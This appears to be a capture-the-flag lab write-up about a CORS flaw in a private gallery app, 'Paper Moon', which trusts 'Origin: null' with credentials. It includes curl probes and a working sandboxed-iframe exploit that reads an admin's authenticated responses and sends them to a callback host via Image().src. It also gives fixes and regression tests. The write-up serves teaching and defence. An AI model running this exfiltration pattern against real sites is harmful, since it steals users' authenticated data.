# Paper Moon CORS Null-Origin Review Bot

## What Is Happening

Paper Moon is a private gallery app. Users log in, then submit a **Review URL** that a headless admin bot visits. Sensitive endpoints such as `/api/me` and `/poster.svg` return CORS headers for `Origin: null` with credentials enabled.

An attacker hosts a page containing a sandboxed iframe, forces a `null` origin, reads the admin's authenticated responses with `fetch(..., {credentials:'include'})`, and exfiltrates the result.

## Why It Happens

The server treats the literal string `Origin: null` as trusted and reflects:

```http
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
```

Browsers send `Origin: null` from sandboxed documents (`iframe sandbox` + `srcdoc`, `data:` URLs, etc.). Combined with credentialed fetches, this becomes a cross-site authenticated read primitive.

The admin flag is not in `/api/me`. For admin users, `/poster.svg` returns an SVG that embeds the flag as text.

## Exploit Chain

1. Log in as `gallery-user` / `moonlight`.
2. Confirm CORS on `Origin: null` for `/api/me` and `/poster.svg`.
3. Host a sandbox iframe exploit on an external origin.
4. From the sandboxed `srcdoc`, fetch sensitive lab endpoints with credentials.
5. Exfiltrate via `Image().src` to OAST or another callback host.
6. Submit the exploit URL through `POST /api/report`.

## Exact Test

CORS probe:

```bash
curl -sI -H "Origin: null" "https://[host]/api/me"
curl -sI -H "Origin: null" "https://[host]/poster.svg"
```

Negative control:

```bash
curl -sI -H "Origin: https://evil.com" "https://[host]/api/me"
```

Report exploit URL:

```bash
curl -s -b "session=$SESSION" -X POST "https://[host]/api/report" \
  -H "Content-Type: application/json" \
  -d '{"url":"https://[exploit-host]/"}'
```

## Expected Signal

- `Origin: null` returns `access-control-allow-origin: null` and `access-control-allow-credentials: true`.
- Random evil origins get no CORS reflection.
- OAST receives `/api/me` JSON for `gallery-admin`.
- OAST receives `/poster.svg` body containing `pwnbox{...}`.

## Working Exploit

```html
<!doctype html>
<html><body>
<iframe sandbox="allow-scripts" srcdoc="
&lt;script&gt;
const O='https://[oast].oast.example';
const T='https://[host]';
function exfil(p,d){(new Image()).src=O+'/'+p+'?'+encodeURIComponent(d)}
fetch(T+'/api/me',{credentials:'include'}).then(r=&gt;r.text()).then(t=&gt;exfil('me',t));
fetch(T+'/poster.svg',{credentials:'include'}).then(r=&gt;r.text()).then(t=&gt;exfil('svg',t));
&lt;/script&gt;
"></iframe>
</body></html>
```

Prefer `Image().src` over `fetch()` for exfil when sandbox or CORS on the callback host may interfere.

## Root Cause

Credentialed CORS reflection for `Origin: null` on authenticated endpoints, plus a review bot that visits attacker URLs while logged in as admin.

## Impact

- Cross-origin theft of authenticated API responses.
- Disclosure of admin-only assets such as `/poster.svg`.
- Session metadata leakage from `/api/me`.

## Fix

- Reject `Origin: null` for credentialed endpoints.
- Replace origin reflection with a strict allowlist of real origins.
- Keep secrets out of endpoints readable through misconfigured CORS.
- Run review bots in an isolated session or block external URL visits with privileged cookies.

## Regression Test

1. Send `Origin: null` to every authenticated API route; assert no `Access-Control-Allow-Credentials: true`.
2. Send `Origin: https://evil.example`; assert no reflection.
3. Verify review-bot workflow cannot be used to trigger credentialed cross-origin reads from external pages.

## Report Summary

Paper Moon exposed authenticated data through CORS that trusted `Origin: null`. A sandboxed attacker page could read admin `/api/me` and `/poster.svg` responses after the review bot visited an attacker URL. The flag was embedded in the admin-only SVG.
